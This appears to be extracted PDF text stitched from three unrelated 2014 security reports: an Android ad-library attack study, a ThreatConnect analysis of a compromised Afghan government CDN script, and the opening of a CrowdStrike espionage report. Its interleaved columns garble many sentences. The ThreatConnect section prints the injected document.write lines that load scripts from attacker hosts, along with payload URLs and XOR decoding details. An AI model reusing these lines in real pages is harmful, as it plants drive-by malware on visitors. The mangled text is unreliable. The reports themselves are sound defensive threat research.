                              the attackers can manipulate Android home                                     Taking Pictures and Recording Audio/Video
                              screen icons using two normal permissions:                                    without User Interaction
                              launcher READ SETTINGS and WRITE                                              Android audio recording via the MediaRecorder
                              SETTINGS permissions. These two permissions                                   APIs does not need user interaction or
                              enable an app to query, insert, delete, or modify                             consent, which makes it easy to record sound
                              all launcher configuration settings, including icon                           in the background.
                              insertion or modification.
                                                                                                            On the contrary, taking pictures and recording
                              As a proof-of-concept attack scenario, a malicious                            videos are more challenging. First, this requires
                              app with these two permissions can query/insert/                              registering Java callbacks. Second, Android warns
                              alter the system icon settings and modify                                     that 
Preview must be started before you can take
                              legitimate icons of some security- sensitive apps,                            a picture
19. It seems that taking pictures and
                              such as banking apps, to a phishing website.                                  recording videos without user notification is
                                                                                                            impossible. However, security largely depends on
                              After our notification, Google has patched this                               the correct implementation and enforcing a
                              vulnerability in Android 4.4.3 and has released the                           flawless implementation is difficult. On some of
                              patch to its OEM partners. However, according to                              the popular phones (models anonymized for
                              Google5, by 7 July 2014, 17.9% Android devices                                security consideration), startPreview() is
                              are using Android 4.4. Given that Android 4.4.2                               required to take pictures/record videos;
                              and below has this vulnerability, over 82.1%                                  However, it
s highly possible that on these
                              Android devices are vulnerable.                                               devices takePicture() fails to check whether a
                                                                                                            view has been presented to the user.
                              Proxy Modification                                                            Fortunately, we have never witnessed a case
                              With the CHANGE WIFI STATE permission,                                        where the MediaRecorder can shoot videos
                              Android processes can change the proxy                                        without calling setPreviewDisplay. But we
                              settings of WIFI networks (not solely the currently                           were able to create and register a dummy
                              connected one). To do this, the attacker can use                              SurfaceView to the WindowManager, which made
                              the remote calls exposed by WifiManager to                                    taking photos and videos possible even on
                              obtain the WifiConfiguration objects, then                                    devices that properly checked for an
                              create new proxySettings to replace to a                                      existing preview.
                               
 http://www.fireeye.com/blog/technical/2014/04/occupy_your_icons_ silently_on_android.html.
                              18
                               
http://developer.android.com/reference/android/hardware/Camera.html.
                              19
10 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              Stealthy App Installation by Abusing                                         case with the attackers eavesdropping or hijacking
                              Credentials                                                                  the HTTP traffic. Switching to HTTPS may not
                              With both the GET ACCOUNTS and the USE                                       solve this issue since the HTTPS security relies on
                              CREDENTIALS permissions, Android pro- cesses                                 a flawless implementation, which is difficult. For
                              can get secret tokens of services (e.g., Google                              example, there are cases where the developer
                              services) from the AccountManager and use them                               failed (intentionally or unintentionally) to check
                              to authenticate to these services20. We verified                             the server
s certificate21. We found that some of
                              that Android apps with these two permissions can                             the most popular ad libraries (see Table 3) have
                              authenticate themselves with the user
s Google                               this issue. We successfully launched Man-in-the-
                              account, allowing access to Google Play and the                              Middle (MITM) attacks and intercepted the data
                              ability send app installation requests. Through the                          uploaded to the remote server. Note that even if
                              Javascript bridge, attackers can install apps of                             the ad libraries have a correct and rigorous
                              choice (e.g., an attacker
s phishing app) to any                             implementation, the SSL library itself may contain
                              devices registered in user
s account in the                                  serious vulnerabilities that can be exploited by
                              background without user consent. Combined                                    MITM attacks22,23.
                              with the launcher modification attack introduced
                              earlier, the attackers can redirect other app icons                          Information Leakage from Ad Libraries
                              (e.g., bank or email app icons) to the phishing app                          Almost every ad library uploads local information
                              and steal the user
s login credentials.                                      from Android devices. Based on our observations,
                                                                                                           they do so mostly for purposes such as checking
                              Targeting Victims Based on Ad Traffic                                        for platform compatibility and user interest
                              In this section, we explain the risks of victims
                            targeting. The information most frequently
                              devices being tracked and targeted through                                   uploaded includes IMEI, Android version,
                              ad traffic.                                                                  manufacturer, Android ID, device specification,
                                                                                                           carrier information, host app information,
                              Communication Channels Prone to Hijack                                       installed app list, etc. Table 3 lists the info
                              It is well known that communication via HTTP is                              uploaded from the top five popular ad libraries.
                              prone to hijacking and data tamper- ing. Though
                              ad libraries may not have the incentive to abuse                             Listing 7 is a captured packet posted to the
                              users
 private and sensitive data, this is not the                           remote ad server by one of the ad libraries. It is
     Listing 7: API
     calls to peek into/           requestactivity=AdRequest&d-device-screen-density=1.5&d-device-screen-
     tamper with the               size=320X533&u-appBId=com.example.app&u-appDNM=Example&u-appVer=1.2&h-user-
                                   agent=Mozilla
     clipboard                     %2F5.0+%28Linux%3B+U%3B+Android+4.1.2%3B+en-us%3B+sdk+Build%2FMASTER%
                                   29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Mobile+Safari
                                   %2F534.30&d-localization=en_us&d-netType=umts&d-orientation=1&u-latlong-accu=
                                   37.410835%2C-121.920514%2C
                              20
                                
 http://seclists.org/bugtraq/2014/Mar/52.
                              21
                                
Sascha Fahl, Marian Harbach, Thomas Muders, Lars Baumga
rtner, Bernd Freisleben, and Matthew Smith. Why eve and mallory love android: An analysis
                                 of android ssl (in) security. In Proceedings of the 2012 ACM conference on Computer and communications security, pages 50
61. ACM, 2012.
                              22
                                
 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224.
                              23
                                
http://www.fireeye.com/blog/technical/2014/04/if-an-android-has-a- heart-does-it-bleed.html.
11 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              captured from a popular Google Play app. From                                DNS hijacking is legally and maliciously used in
                              this packet we can tell the device
s screen density                          many situations including traffic management,
                              (d-device-screen-density), screen size (d-device-                            phishing and censorship. Attackers successfully
                              screen-size), host app
s pack- age name (u-appBId),                          compromised many DNS servers, including the
                              host app
s name (u-appDNM)1, host app
s version                              ones from Google and Godaddy24. By DNS
                              (u-appVer), user agent (h-user-agent), localization                          hijacking, attackers can effectively access all the
                              (d-localization), mobile network type (d-netType),                           traffic to ad servers.
                              screen orientation (d-orientation), and GPS
                              location (u-latlong-accu). The most important                                BGP hijacking takes over groups of IP addresses,
                              infor- mation is the GPS location, where the                                 corrupting Internet routing tables by breaking
                              victim
s latitude, longitude and the location                                BGP sessions or injecting fake BGP information.
                              precision are shown. It is reasonable for an ad to                           This enables attackers to monitor all traffic to
                              obtain this information to improve the ad-serving                            specific IPs. Historically, there were many BGP
                              experience. However, with this information, an                               hijacking attacks that affected YouTube, DNS root
                              attacker can precisely locate the victim and                                 servers, Yahoo, and many other important
                              acquire the device
s specifications.                                         Internet services25.
                              Large-scale Monitoring and Precise Hijacking                                 ARP hijacking (or spoofing) in IDC26 is done to
                              To locate victims effectively, an attacker needs to                          hijack the traffic to the ad server in the IDC where
                              monitor large-scale network traffic containing                               the ad server locates through fake ARP packets.
                              such private information. Unfortunately, several                             Attackers may rent servers close to the target
                              well-known attacks can be used to achieve                                    servers, and use fake ARP packets to direct all the
                              large-scale monitoring, including DNS hijacking,                             traffic to go through the hijacking servers first for
                              BGP hijacking, and ARP hijacking in IDC.                                     monitoring and hijacking..ARP hijacking is a
                                                                                                           well-known approach used in network attacks.
                              In this context, DNS hijacking is done to subvert
                              the resolution of Domain Name System (DNS)                                   Using the large-scale traffic intercepted from the
                              queries through modifying the behavior of DNS                                above methods, attackers can iden- tify potential
                              servers so that they serve fake DNS information.                             victims based on information leakage such as GPS
     Figure 4: Number                                                                            App Num
     of ad libraries
     included in Google
                                                      25017
     Play apps (with
     more than 50,000                       20429
     downloads
                                                                 9196
                                                                           4452
                                                                                                         2543
                                                                                     2343
                                                                                                                   1609         1310
                                                                                               1291                                    607         980
                                                                                                                                             498
                                     0
                                               0         1         2         3         4         5         6          7          8      9    10    >10
                               
 https://isc.sans.edu/diary/Domaincontrol+(GoDaddy)+Nameservers+DNS+ Poisoning+/5146.
                              24
                               
http://www.networkworld.com/article/2272520/lan-wan/six-worst-internet- routing-attacks.html.
                              25
                               
http://en.wikipedia.org/wiki/ARP\_spoofing.
                              26
12 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              location described in Sec- tion 4.2. After that,        using Ad1, Ad2, ..., Ad92 to refer to them, where
                              they can inject exploits only into the targeted         the subscripts represent the rankings of how
                              traffic to launch further attacks. Attackers keep a     many apps include the ad libraries. The top five
                              low profile by allowing all other irrelevant            popular ad libraries
 inclusion and download
                              network traffic to pass without being modified.         statistics are listed in Table 2.
                              Targetable and Exploitable Google                       We analyzed the 92 ad libraries found in the
                              Play Apps                                               popular Google Play apps, and summa- rized the
                              We used the FireEye Mobile Threat Prevention            communication channel vulnerabilities in Table
                              (MTP) engine to analyze all of the ~73,000              3. Combined with the uploaded information
                              popular apps from Google Play with more than            column we can learn about the data the
                              50,000 downloads, and identified 93 ad libraries.       attackers can obtain.
                              The detailed ad library inclusion statistics are
                              shown in Figure 4. Seventy-one% of the apps             Fifty-seven of the 92 ad libraries in the popular
                              contain at least one ad library, 35% have at least      Google Play apps have the JBOH issue.
                              two ad libraries, and 22.25% include at least           Specifically, four of the top five ad libraries are
                              three ad libraries. The largest ad inclusion            subject to this problem (shown in Table 2). Seven
                              number is 35. Since Google is cautious about the        of the 92 ad libraries are prone to DLOH attacks.
                              security of the products it directly controls, we       Particularly, some versions of Ad5 in Table 3 have
                              exclude Google Ad from the following discussion.        this problem. The affected Google Play apps
                              For security considerations, in this paper we           number and the accumulated download counts
                              anonymize the names of the other 92 ad libraries,       are listed in Table 4.
                              
     Table 2: The
     inclusion statistics          Ad Library         Number of Apps      JBOH Apps          Total Downloads      JBOH Downloads
     of the top five
     Android ad
                                      Ad1                 9,702              2,802               8,781M               2,348M
     libraries excluding
     Google Ad. Their
     JBOH statistics                  Ad2                 8,856              4,204               7,865M               4,754M
     are also listed
     (discussed in
                                      Ad3                 8,818              2,117               8,499M               1,611M
     the earlier JBOH
     section.).
                                      Ad4                 5,519              1,112               4,687M                617M
                                      Ad5                 5,170               0                  4,519M                  0
13 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              
     Table 3: The
                                   Ad Library                         Uploaded Info                       Protocol   SSL Vuln       JBOH       DLOH
     uploaded data,
     communication
     channel                                               IMEI/device id, device model, An-              HTTP/
                                      Ad1
                                                                 droid version, location                  HTTPS
     vulnerabilities, and
     JBOH/DLOH details
                                                          device specification, Android version,
     of the top five ad               Ad2                                                                  HTTP
                                                                  host app info, location
     libraries.
                                                           IMEI/device id, device model, An-
                                      Ad3           droid version, device manufacturer, carrier info,      HTTP
                                                                      location, ip
                                                          IMEI/device id, device model, device
                                      Ad4                                                                  HTTP
                                                            specification, Android version
                                                          IMEI/device id, device model, device
                                      Ad5               specification, Android version, coun- try,        HTTPS
                                                                        launguage
                                                
     Table 4: Assessment statistics                                                                       Type I                            Type II
                                                       Subject to attack type           Type I #                        Type II #
     of Google Play apps (downloads                                                                     Downloads                          Downloads
     
50,000) that are vulnerable to the
                                                      Code injection via ptrace          2,055            444M            272                67M
     Sidewinder Targeted Attack. Type I
     apps are those subject to JBOH or                       Send SMS                     349             340M            229                254M
     DLOH attacks; Type II apps are those
     not only JBOH/DLOH exploitable but                  Make phone calls                 572             399M            426                324M
     also have the LOCATION leakage
                                                       Launcher modification              111             95M              81                37M
     (thus vulnerable to the Sidewinder
     Targeted Attack). Note that an app                 Proxy modification                644             792M            419                378M
     is counted in the total statistics if
     it is subject to any of the attacks,                  Record audio                  1,097           1,408M           654                621M
     including uploading files and root             Take pictures/record videos          1,141           1,380M           622                665M
     exploits.
                                                       Install apps stealthily            351             552M            197                332M
                                                      Total(incl. root exploits)        16,579          11,706M          4,201              3,207M
14 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              Conclusion
                              In the current golden age of Android ad              1.
 Android is a complex system. Any sub-
                              libraries, Sidewinder Targeted Attacks can               component
s vulnerability may impact the
                              target victims using info leakage and other              security of the whole system.
                              vulnerabilities of ad libraries to get valuable,         Fragmentation makes the situation even
                              sensitive information. Millions of users are still       more challenging.
                              under the threat of Sidewinder Targeted
                              Attacks. First we need to improve the security       2.
 The trade-off between usability,
                              and privacy protection of ad libraries. For              performance and security always matters,
                              example, we encourage ad libraries
 publishers           and market demand frequently dictates
                              to use HTTPS with proper SSL certificate                 that security comes last. Many Android
                                                                                       developers do not even understand how
                                                                                       to program securely (as shown in the
                                                                                       JBOH issue).
Sidewinder Targeted Attacks can target
victims using info leakage and other                                               3.
 Many security patches are not back-ported
                                                                                       to old versions of Android (like the launcher
vulnerabilities of ad libraries to get valuable,                                       settings problem described earlier), even
sensitive information. Millions of users are                                           though older versions are widely used.
still under the threat of Sidewinder                                               4.
 There is always information asymmetry in
Targeted Attacks.                                                                      the development chain. For example, it
                                                                                       usually takes several months for vendors to
                                                                                       apply security patches after Google
                                                                                       releases them.
                              validation, and to properly encrypt network
                              traffic. They also need to be cautious about         Albeit challenging, we hope that this work
                              which privileged interfaces are exposed to the       can kickstart a conversation, both on
                              ad providers, in case of malicious ads or            improved security and privacy protection in
                              attackers hijacking the communication channels.      third-party libraries and on a hardened
                                                                                   Android security framework.
                              Meanwhile, Google itself needs to further
                              harden the security framework. This may prove
                              difficult because:
15 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                                    About FireEye, Inc.                                   provides real-time, dynamic threat protection
                                    FireEye has invented a purpose-built, virtual         without the use of signatures to protect an
                                    machine-based security platform that provides         organization across the primary threat vectors and
                                    real-time threat protection to enterprises and        across the different stages of an attack life cycle.
                                    governments worldwide against the next                The core of the FireEye platform is a virtual
                                    generation of cyber attacks. These highly             execution engine, complemented by dynamic threat
                                    sophisticated cyber attacks easily circumvent         intelligence, to identify and block cyber attacks in
                                    traditional signature-based defenses, such as         real time. FireEye has over 1,900 customers across
                                    next-generation firewalls, IPS, anti-virus, and       more than 60 countries, including over 130 of the
                                    gateways. The FireEye Threat Prevention Platform      Fortune 500.
FireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com
 2014 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye,
Inc. All other brands, products, or service names are or may be trademarks or service
marks of their respective owners. WP.SW.EN-US.072014
Operation Poisoned Helmand
In this day and age of interconnected cloud services and distributed content delivery networks (CDNs), it
is important for both CDN service providers and security professionals alike to recognize and understand
the risks that these systems can introduce within an modern enterprise. For organizations within both
public and private sectors that leverage CDN platforms to dynamically deliver web content, it is important
that the content is also routinely monitored. Otherwise, malicious third-party content can be loaded into a
target organization
s website without their knowledge, delivering untold risks to unwitting visitors.
Afghan Government 
Watering Hole
The ThreatConnect Intelligence Research Team (TCIRT) recently observed a targeted cross-site scripting
(XSS) 
drive-by
 attack that leveraged a single content delivery network resource to distribute a malicious
Java applet via nearly all of the major official Government of Afghanistan websites. The compromised
CDN resource in question is a JavaScript file hosted at [http:]//cdn.afghanistan[.]af/scripts/gop-script.js
The domain cdn.afghanistan[.]af is a legitimate CDN site used by the Afghan Ministry of Communications
and IT (MCIT) to host web content that is displayed and used on many official gov.af websites.
The javascript URL ([http:]//cdn.afghanistan[.]af/scripts/gop-script.js) is called from numerous official
Afghan Government websites, including the following:
      [http:]//canberra.afghanistan[.]af/en (Afghan Embassy in Canberra, Australia)
      [http:]//herat.gov[.]af/fa (Herat Province Regional Government)
      [http:]//mfa.gov[.]af/en (Ministry of Foreign Affairs)
      [http:]//moci.gov[.]af/en (Ministry of Commerce and Industries)
      [http:]//moe.gov[.]af/en (Ministry of Education)
      [http:]//mof.gov[.]af/en (Ministry of Finance)
      [http:]//moj.gov[.]af/fa (Ministry of Justice)
      [http:]//mowa.gov[.]af/fa (Ministry of Women
s Affairs)
      [http:]//oaacoms.gov[.]af/fa (Office of Administrative Affairs and Council of Ministers)
It is likely that this javascript URL itself is normally legitimate, but the attackers obtained access to the file
and prepended the following malicious JavaScript functions to the beginning of the script:
document.write("<script src=http://update.javaplug-in.com/o/j.js><\/script>");
document.write("<script src=http:\/\/neoting.com/pay/danal/PhoneBill/07/1.js>
<\/script>");
Note that the gov.af websites would not need to be compromised individually for this attack to be
delivered to visitors of the sites, because it is the backend CDN infrastructure that is serving up the
malicious script.
Li Keqiang: A Harbinger of Targeted Exploitation?
Judging by the last modified timestamp on the HTTP response of gop-script.js, which is Tue, 16 Dec 2014
08:07:06 GMT, this malicious CDN compromise was very recent in nature. In fact, it occurred on the very
same day that China
s Prime Minister Li Keqiang would meet with Abdullah Abdullah, the Chief Executive
Officer of Afghanistan in Astana Kazakhstan, they would discuss infrastructure development and bilateral
cooperation issues.
Looking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the
Chinese embassy website we note a Tue, 16 December 2014 07:43:31 modify time as well as the
www.news[.]cn watermark in the bottom righthand corner. This indicates that the image of Keqiang and
Abdullah was likely taken and edited sometime prior to 07:43:31. While it is ambiguous as to which
timezone the edits actually took place in (Kazakhstan or China) we assume the date
timestamp references GMT because the press release states 
In the afternoon of December 15 local time
If we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma-Ata
standard time (+0600) this would closely correspond with a 07:43 GMT time stamp. The modification of
the gop-script.js by the attackers at 08:07:06 GMT likely tracks extremely close to a window of a few hours
in which Keqiang met with Abdullah.
It is worth mentioning that a similar scenario occurred on June 20th when security researcher
PhysicalDrive0 observed a malicious Java file hosted on the Embassy of Greece in Beijing. At the time, a
Chinese delegation led by Keqiang was visiting Greek Prime Minister Antonis Samaras in Athens. Security
researcher R136a1 aka 
thegoldenmessenger
 released a followup blog with detailed analysis of the Greek
embassy compromise.
While these two separate events are not directly related, additional research into the status of ministerial
and official government websites on or around the dates of notable Chinese delegations and or bilateral
meetings may yield additional patterns of interest.
Java Malware Overlap
Upon closer inspection of the prepended malicious JavaScript code, one will notice the similarity in the
update.javaplug-in[.]com naming convention and URL structure to the C2 domain java-se[.]com found in
the Palo Alto Networks blog post Attacks on East Asia using Google Code for Command and Control and
associated with Operation Poisoned Hurricane. However, the malicious document.write driveby URLs
listed above both result in 403 Forbidden errors as of December 18, 2014.
While the 403 Forbidden errors may seem like an analytic dead end, the TCIRT also identified a malicious
Java applet submission to VirusTotal that confirms the nature of this malicious activity. This Java applet,
SHA1: 388E6F41462774268491D1F121F333618C6A2C9A, has no antivirus detections as of December
21st. The applet contains its malicious class file at the path 
jre7u61windows/x86/Update.class
. This
class file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from
[http:]//mfa.gov[.]af/content/images/icon35.png, hosted on the official Afghan Ministry of Foreign
Affairs site, which was also affected by the gop-script XSS.
Using historic context archived within ThreatConnect, the TCIRT concluded that this Java applet is from
the same source code as the applet SHA1: ADC162DD909283097E72FC50B7AB0E04AB8A2BCC, which
was previously observed by the TCIRT at the Operation Poisoned Hurricane related URL
[http:]//jre7.java-se[.]com/java.jar on August 15, 2014. This applet has the same class path, and
downloads an XOR 0xFF encoded payload executable from the URL [https:]//amco-
triton.co[.]jp/js/dl/in.jpg. Additional indicators and context associated with this particular Java driveby
activity can be found in the ThreatConnect Common Community Incident 20140815A: java-se APT
Driveby (shared October 02, 2014)
The Windows PE Payload
The XOR 0xC8 encoded payload downloaded from [http:]//mfa.gov[.]af/content/images/icon35.png
decodes into the Windows PE executable SHA1: 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB
This executable is a self-extracting (SFX) Microsoft Cabinet executable that is digitally signed with a valid
certificate from 
OnAndOn Information System Co., Ltd.
, serial number 
1F F7 D8 64 18 1C 55 5E 70 CF
DD 3A 59 34 C4 7D
. This same certificate was also used to sign the Java applet that downloaded this
malware.
This executable drops the following files:
      SHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)
Legitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll
      SHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)
Malicious DLL that loads into the above dllhost.exe, using a similar DLL sideloading technique to that
most commonly associated with the PlugX backdoor.
      SHA1: 5C8683E3523C7FA81A0166D7D127616B06334E8D (Readme.txt)
Malicious encrypted backdoor binary blob loaded by dbgeng.dll
This backdoor connects to the faux Oracle Java themed command and control (C2) domain
oracle0876634.javaplug-in[.]com. Note that javaplug-in[.]com is the same root domain found in the
compromised version of [http:]//cdn.afghanistan[.]af/scripts/gop-script.js as [http:]//update.javaplug-
in[.]com/o/j.js, confirming that this Java malware is in fact directly associated with the Afghan MCIT
CDN XSS compromise.
Full indicators of this activity and a YARA rule to detect the malware certificate can be found in the
ThreatConnect Common Community under Incident 20141217A: Afghan Government Java Driveby and
signature APT_OnAndOn_cert.yara.
Conclusion
As the US and NATO reduce their troop levels in Afghanistan, China is posturing to fill the gap of
influence that the west is leaving behind. With plans to facilitate multilateral peace talks with the Taliban
and establish major transportation projects which aim to bolster the Afghan economy, Beijing has been
eyeing Afghanistan as part of its broader South Asian strategy.
By exploiting and co-opting Afghan network infrastructure that is used by multiple ministerial level
websites, Chinese intelligence services would be able to widely distribute malicious payloads to a variety of
global targets using Afghanistan
s government websites as a topical and trusted distribution platform,
exploiting a single hidden entry point. This being a variant of a typical 
watering-hole
 attack, the
attackers will most likely infect victims outside the Afghan government who happened to be browsing any
one of the CDN client systems, specifically, partner states involved in the planned troop reduction.
It is important to consider that corporate enterprises are not immune to this tactic, and this is not just a
technique that is used by APT threat actors. If an enterprise
s website leverages a CDN to speed up content
delivery, unintended consequences must be anticipated. Fortunately, modern browsers now implement a
security concept called 
Content Security Policy
. As long as the server
s response headers are configured
properly, third party content may be restricted to originating from a narrow whitelist.
Just as attackers distribute malicious content to users en masse or CDN services distribute web content to
users, security professionals must be able to quickly distribute actionable Threat Intelligence in formats
readable by both humans and machines. ThreatConnect is the industry
s first comprehensive Threat
Intelligence Platform that enables enterprises to orchestrate the aggregation of Threat Intelligence from
multiple sources, use integrated analytics and a robust API that gives enterprises the control to action
their own Threat Intelligence, in the cloud and on premises. Register for a free account now to view the
Common Community shares and more.
CrowdStrike                                                                                                                                   Putter Panda
Intelligence
Report
Crowdstrike Global Intelligence Team
This report is part of the series of technical and strategic reporting available to CrowdStrike Intelligence subscribers. It is being released publicly
to expose a previously undisclosed PLA unit involved in cyberespionage against Western technology companies.
In May 2014, the U.S. Department of Justice charged five Chinese nationals for economic espionage against U.S.
corporations. The five known state actors are officers in Unit 61398 of the Chinese People
s Liberation Army (PLA). In
response, the Chinese government stated that the claims were 
absurd
 and based on 
fabricated facts
. China then went
even further, stating 
The Chinese government, the Chinese military and their relevant personnel have never engaged or
participated in cyber theft of trade secrets.
We believe that organizations, be they governments or corporations, global or domestic, must keep up the pressure and hold
China accountable until lasting change is achieved. Not only did the U.S. Government offer in its criminal indictment the
foundation of evidence designed to prove China
s culpability in electronic espionage, but also illustrated that the charges
are only the tip of a very large iceberg. Those reading the indictment should not conclude that the People
s Republic of
China (PRC) hacking campaign is limited to five soldiers in one military unit, or that they solely target the United States
government and corporations. Rather, China
s decade-long economic espionage campaign is massive and unrelenting.
Through widespread espionage campaigns, Chinese threat actors are targeting companies and governments in every
part of the globe.
At CrowdStrike, we see evidence of this activity first-hand as our services team conducts Incident Response investigations
and responds to security breaches at some of the largest organizations around the world. We have first-hand insight into the
billions of dollars of intellectual property systematically leaving many of the largest corporations - often times unbeknownst
to their executives and boards of directors.
The campaign that is the subject of this report further points to espionage activity outside of Unit 61398, and reveals
the activities of Unit 61486. Unit 61486 is the 12th Bureau of the PLA
s 3rd General Staff Department (GSD) and is
headquartered in Shanghai, China. The CrowdStrike Intelligence team has been tracking this particular unit since 2012,
under the codename PUTTER PANDA, and has documented activity dating back to 2007. The report identifies Chen Ping,
aka cpyy, and the primary location of Unit 61486.
This particular unit is believed to hack into victim companies throughout the world in order to steal corporate trade
secrets, primarily relating to the satellite, aerospace and communication industries. With revenues totaling $189.2 billion
in 2013, the satellite industry is a prime target for espionage campaigns that result in the theft of high-stakes intellectual
property. While the gains from electronic theft are hard to quantify, stolen information undoubtedly results in an improved
competitive edge, reduced research and development timetables, and insight into strategy and vulnerabilities of the
targeted organization.
Parts of the PUTTER PANDA toolset and tradecraft have been previously documented, both by CrowdStrike, and in open
source, where they are referred to as the MSUpdater group. This report contains details on the tactics, tools, and techniques
used by PUTTER PANDA, and provides indicators and signatures that can be leveraged by organizations to protect
themselves against this activity. Our Global Intelligence Team actively tracks and reports on more than 70 espionage groups,
approximately half of which operate out of China and are believed to be tied to the Chinese government. This report is part
of our extensive intelligence library and was made available to our intelligence subscribers in April 2014, prior to the
US Government
s criminal indictment and China
s subsequent refusal to engage in a constructive dialog.
Targeted economic espionage campaigns compromise technological advantage, diminish global competition, and ultimately
have no geographic borders. We believe the U.S. Government indictments and global acknowledgment and awareness
are important steps in the right direction. In support of these efforts, we are making this report available to the public to
continue the dialog around this ever-present threat.
                                                  George Kurtz
                                      President/CEO & Co-Founder, CrowdStrike
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Table of    Executive summary....................................................................................................................... 4
Contents:   Key Findings........................................................................................................................................ 5
            attribution....................................................................................................................................... 7
            C2 Indicators................................................................................................................................... 8
                Targeting....................................................................................................................................... 10
                Connections to Other Adversary Groups.................................................................................. 11
            
CPYY
................................................................................................................................................ 12
                711 Network Security Team......................................................................................................... 16
                Military Connections.................................................................................................................... 17
            Unit 61486.......................................................................................................................................... 20
            Binary Indicators.......................................................................................................................... 24
            conclusions................................................................................................................................... 25
            TECHNICAL ANALYSIS...................................................................................................................... 27
            3PARA RAT.......................................................................................................................................... 28
            PNGDOWNER.................................................................................................................................... 33
            HTTPCLIENT......................................................................................................................................... 34
            DROPPERS - RC4 AND XOR BASED.................................................................................................. 35
            MITIGATION & REMEDIATION........................................................................................................... 38
            REGISTRY ARTIFACTS.......................................................................................................................... 39
            FILE SYSTEM ARTIFACTS...................................................................................................................... 39
            HOST INDICATORS.............................................................................................................................. 39
                YARA Rules.................................................................................................................................... 40
            NETWORK SIGNATURES...................................................................................................................... 44
               Snort Rules.................................................................................................................................. 44
            TTPS..................................................................................................................................................... 46
            Conclusion................................................................................................................................... 48
            APPENDIX 1: 4H RAT SAMPLE METADATA........................................................................................ 50
            APPENDIX 2: 3PARA RAT SAMPLE METADATA.................................................................................. 53
            APPENDIX 3: PNGDOWNER SAMPLE METADATA............................................................................. 54
            APPENDIX 4: HTTPCLIENT SAMPLE METADATA................................................................................. 57
            CrowdStrike Falcon Intelligence........................................................................................... 58
            CrowdStrike Falcon................................................................................................................... 59
            About CrowdStrike...................................................................................................................... 60
                                                                                                                                                                      2
Executive Summary
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
EXECUTIVE SUMMARY
CrowdStrike has been tracking the activity of a cyber espionage group operating out of Shanghai,
China, with connections to the People
s Liberation Army Third General Staff Department (GSD) 12th
Bureau Military Unit Cover Designator (MUCD) 61486, since 2012. The attribution provided in this report
points to Chen Ping, aka cpyy (born on May 29, 1979), as an individual responsible for the domain
registration for the Command and Control (C2) of PUTTER PANDA malware. In addition to cpyy, the
report identifies the primary location of Unit 61486.
PUTTER PANDA is a determined adversary group, conducting intelligence-gathering operations
targeting the Government, Defense, Research, and Technology sectors in the United States, with
specific targeting of the US Defense and European satellite and aerospace industries. The PLA
s GSD
Third Department is generally acknowledged to be China
s premier Signals Intelligence (SIGINT)
collection and analysis agency, and the 12th Bureau Unit 61486, headquartered in Shanghai,
supports China
s space surveillance network.
Domains registered by Chen Ping were used to control PUTTER PANDA malware. These domains were
registered to an address corresponding to the physical location of the Shanghai headquarters of
12th Bureau, specifically Unit 61486. The report illuminates a wide set of tools in use by the actors,
including several Remote Access Tools (RATs). The RATs are used by the PUTTER PANDA actors to
conduct intelligence-gathering operations with a significant focus on the space technology sector.
This toolset provides a wide degree of control over a victim system and can provide the
opportunity to deploy additional tools at will. They focus their exploits against popular productivity
applications such as Adobe Reader and Microsoft Office to deploy custom malware through
targeted email attacks.
This report contains additional details on the tactics, tools, and techniques used by PUTTER PANDA,
and provides indicators and signatures that can be leveraged by organizations to protect
themselves against this activity.
                                                                                                         4
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
KEY FINDINGS
Putter Panda is a cyber espionage      
The group has been operating since
   actor that conducts operations from       at least 2007 and has been observed
   Shanghai, China, likely on behalf of      heavily targeting the US Defense and
   the Chinese People
s Liberation Army      European satellite and aerospace
   (PLA) 3rd General Staff Department        industries.
   12th Bureau Unit 61486. This unit is
   supports the space based signals       
They focus their exploits against
   intelligence (SIGINT) mission.             popular productivity applications
                                              such as Adobe Reader and Microsoft
The 12th Bureau Unit 61486,                Office to deploy custom malware
   headquartered in Shanghai, is widely       through targeted email attacks.
   accepted to be China
s primary
   SIGINT collection and analysis         
CrowdStrike identified Chen Ping,
   agency, supporting China
s space          aka cpyy, a suspected member of
   surveillance network.                     the PLA responsible for procurement
                                             of the domains associated with
This is a determined adversary            operations conducted by Putter
   group, conducting intelligence-           Panda.
   gathering operations targeting the
   Government, Defense, Research,         
There is infrastructure overlap with
   and Technology sectors in the             Comment Panda, and evidence
   United States, with specific              of interaction between actors tied
   targeting of space, aerospace,            to both groups.
   and communications.
                                                                                    5
Attribution
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Attribution
There are several pieces of evidence
to indicate that the activity tracked
by CrowdStrike as PUTTER PANDA is
attributable to a set of actors based
in China, operating on behalf of the
Chinese People
s Liberation Army (PLA).
Specifically, an actor known as cpyy (Chen
Ping) appears to have been involved
in a number of historical PUTTER PANDA
campaigns, during which time he was likely
working in Shanghai within the 12th Bureau,
3rd General Staff Department (GSD).
PUTTER PANDA has several connections to
actors and infrastructure tied to COMMENT
PANDA, a group previously attributed to
Unit 61398 of the PLA.
                                              7
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                        C2 Indicators
                                        Although some of the domains used
                                        for command and control of the tools
                                        described later in this report appear
                                        to be legitimate sites that have been
                                        compromised in some way, many of
                                        them appear to have been originally
                                        registered by the operators. Table
                                        1 shows the domains that appear
                                        to have been registered by these
                                        actors, and the original email address
                                        used where known.
                                       Table 1.
                                       C2 Domains and
                                       Original Registrant
